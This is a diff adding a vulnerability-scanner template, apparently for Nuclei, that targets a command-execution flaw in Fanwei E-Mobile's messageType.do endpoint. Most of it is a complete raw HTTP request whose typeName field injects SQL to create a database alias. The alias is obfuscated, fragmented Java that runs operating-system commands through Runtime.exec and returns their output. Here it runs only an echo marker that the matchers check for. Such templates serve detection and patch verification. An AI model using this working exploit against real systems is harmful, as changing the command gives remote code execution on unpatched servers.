@@ -1,0 +1,48 @@
+id: fanweiOA-E-Mobile-messageType-do-rce
+
+info:
+  name: 泛微E-Mobile-messageType.do存在命令执行漏洞
+  author: cnaq
+  severity: high  
+  description: 泛微E-Mobile-messageType.do存在命令执行漏洞
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEE-Mobile-messageType.do%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+  tags: lfi,ecology,fanwei,oa
+
+
+requests:
+  - raw:
+      - |
+        POST /messageType.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=00content0boundary00
+        User-Agent: Java/1.8.0_371
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-Length: 1090
+        Connection: close
+
+        --00content0boundary00
+        Content-Disposition: form-data; name="method"
+
+        create
+        --00content0boundary00
+        Content-Disposition: form-data; name="typeName"
+
+        1';CREATE ALIAS if not exists MzSNqKsZTagm AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod("getWriter");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter("\\A");writer.write(scan','ner.hasNext()?sca','nner.next():"");}');CALL MzSNqKsZTagm('echo 1q2w3e4r');--
+        --00content0boundary00--
+
+
+    matchers-condition: and  
+    matchers:
+      # 漏洞返回页面无特征，使用过滤方式减少误报
+      # 基本条件1 响应状态
+      - type: status
+        status:
+          - 200
+      # 高级条件 内容必有的单字符
+      - type: word
+        part: body
+        words:
+          - '1q2w3e4r'
+        condition: and
+
